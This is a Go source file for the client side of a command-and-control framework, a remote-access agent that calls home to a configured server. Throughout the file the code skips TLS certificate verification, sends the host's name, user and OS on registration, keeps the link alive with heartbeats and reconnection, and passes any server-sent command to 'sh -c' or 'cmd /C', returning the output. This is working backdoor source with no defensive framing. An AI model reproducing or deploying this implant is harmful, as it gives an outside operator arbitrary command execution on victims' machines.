package client

import (
	"c2-framework/internal/common"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type ClientApp struct {
	host         string
	port         string
	clientID     string
	conn         net.Conn
	reconnectInterval time.Duration
}

func NewClient(host, port, clientID string) *ClientApp {
	if clientID == "" {
		hostname, _ := os.Hostname()
		clientID = fmt.Sprintf("%s_%d", hostname, time.Now().Unix())
	}
	
	return &ClientApp{
		host:              host,
		port:              port,
		clientID:          clientID,
		reconnectInterval: 10 * time.Second,
	}
}

func (c *ClientApp) Start() {
	fmt.Printf("🚀 Starting C2 Client: %s\n", c.clientID)
	fmt.Printf("🎯 Target: %s:%s\n", c.host, c.port)
	
	for {
		if err := c.connectToServer(); err != nil {
			log.Printf("❌ Connection failed: %v", err)
			fmt.Printf("🔄 Retrying in %v...\n", c.reconnectInterval)
			time.Sleep(c.reconnectInterval)
			continue
		}
		fmt.Println("🔄 Connection lost, attempting to reconnect...")
		time.Sleep(c.reconnectInterval)
	}
}

func (c *ClientApp) connectToServer() error {
	var conn net.Conn
	var err error
	
	// Try TLS first
	conn, err = tls.Dial("tcp", c.host+":"+c.port, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		// Fallback to insecure connection
		conn, err = net.Dial("tcp", c.host+":"+c.port)
		if err != nil {
			return err
		}
		fmt.Println("⚠️  Connected using insecure connection")
	} else {
		fmt.Println("🔒 Connected using TLS encryption")
	}

	c.conn = conn
	defer conn.Close()

	// Send registration
	if err := c.register(); err != nil {
		return err
	}

	fmt.Println("✅ Successfully registered with server")

	// Start heartbeat
	go c.heartbeat()

	// Handle commands
	return c.handleCommands()
}

func (c *ClientApp) register() error {
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	if user == "" {
		user = "unknown"
	}

	info := common.ClientInfo{
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Hostname: hostname,
		User:     user,
	}

	infoData, _ := json.Marshal(info)
	msg := common.Message{
		Type:      "register",
		ClientID:  c.clientID,
		Result:    string(infoData),
		Timestamp: time.Now().Unix(),
	}

	data, _ := json.Marshal(msg)
	_, err := c.conn.Write(append(data, '\n'))
	return err
}

func (c *ClientApp) heartbeat() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		msg := common.Message{
			Type:      "heartbeat",
			ClientID:  c.clientID,
			Timestamp: time.Now().Unix(),
		}
		data, _ := json.Marshal(msg)
		if _, err := c.conn.Write(append(data, '\n')); err != nil {
			return
		}
	}
}

func (c *ClientApp) handleCommands() error {
	decoder := json.NewDecoder(c.conn)
	
	for {
		var msg common.Message
		if err := decoder.Decode(&msg); err != nil {
			return err
		}

		if msg.Type == "command" {
			result := c.executeCommand(msg.Command)
			c.sendResult(result)
		}
	}
}

func (c *ClientApp) executeCommand(command string) string {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return "❌ Empty command"
	}

	switch parts[0] {
	case "sysinfo":
		return c.getSystemInfo()
	case "pwd":
		dir, err := os.Getwd()
		if err != nil {
			return fmt.Sprintf("❌ Error: %v", err)
		}
		return fmt.Sprintf("📁 Current directory: %s", dir)
	case "ls", "dir":
		return c.listDirectory()
	case "cd":
		if len(parts) < 2 {
			return "❌ Usage: cd <directory>"
		}
		err := os.Chdir(parts[1])
		if err != nil {
			return fmt.Sprintf("❌ Error: %v", err)
		}
		newDir, _ := os.Getwd()
		return fmt.Sprintf("✅ Changed to: %s", newDir)
	case "whoami":
		user := os.Getenv("USER")
		if user == "" {
			user = os.Getenv("USERNAME")
		}
		return fmt.Sprintf("👤 Current user: %s", user)
	case "ps", "processes":
		return c.listProcesses()
	case "upload":
		return "📤 File upload not implemented in this version"
	case "download":
		return "📥 File download not implemented in this version"
	default:
		// Execute system command
		return c.executeSystemCommand(command)
	}
}

func (c *ClientApp) getSystemInfo() string {
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	
	return fmt.Sprintf("💻 System Information:\n"+
		"OS: %s\n"+
		"Architecture: %s\n"+
		"Hostname: %s\n"+
		"User: %s\n"+
		"Go Version: %s",
		runtime.GOOS, runtime.GOARCH, hostname, user, runtime.Version())
}

func (c *ClientApp) listDirectory() string {
	pwd, _ := os.Getwd()
	entries, err := os.ReadDir(".")
	if err != nil {
		return fmt.Sprintf("❌ Error: %v", err)
	}

	var result strings.Builder
	result.WriteString(fmt.Sprintf("📁 Directory listing for: %s\n\n", pwd))
	
	for _, entry := range entries {
		info, _ := entry.Info()
		if entry.IsDir() {
			result.WriteString(fmt.Sprintf("📂 %-30s <DIR>\n", entry.Name()))
		} else {
			result.WriteString(fmt.Sprintf("📄 %-30s %d bytes\n", entry.Name(), info.Size()))
		}
	}
	return result.String()
}

func (c *ClientApp) listProcesses() string {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("tasklist", "/FO", "CSV")
	case "darwin":
		cmd = exec.Command("ps", "aux")
	default:
		cmd = exec.Command("ps", "aux")
	}

	output, err := cmd.Output()
	if err != nil {
		return fmt.Sprintf("❌ Error listing processes: %v", err)
	}
	
	lines := strings.Split(string(output), "\n")
	if len(lines) > 20 {
		lines = lines[:20]
		return fmt.Sprintf("🔄 Process List (first 20):\n%s\n... (truncated)", strings.Join(lines, "\n"))
	}
	
	return fmt.Sprintf("🔄 Process List:\n%s", string(output))
}

func (c *ClientApp) executeSystemCommand(command string) string {
	var cmd *exec.Cmd
	
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/C", command)
	default:
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	result := string(output)
	
	if err != nil {
		return fmt.Sprintf("❌ Command failed: %v\n📤 Output:\n%s", err, result)
	}
	
	if len(result) > 2000 {
		result = result[:2000] + "\n... (output truncated)"
	}
	
	return fmt.Sprintf("✅ Command executed successfully:\n%s", result)
}

func (c *ClientApp) sendResult(result string) {
	msg := common.Message{
		Type:      "result",
		Result:    result,
		ClientID:  c.clientID,
		Timestamp: time.Now().Unix(),
	}

	data, _ := json.Marshal(msg)
	c.conn.Write(append(data, '\n'))
}
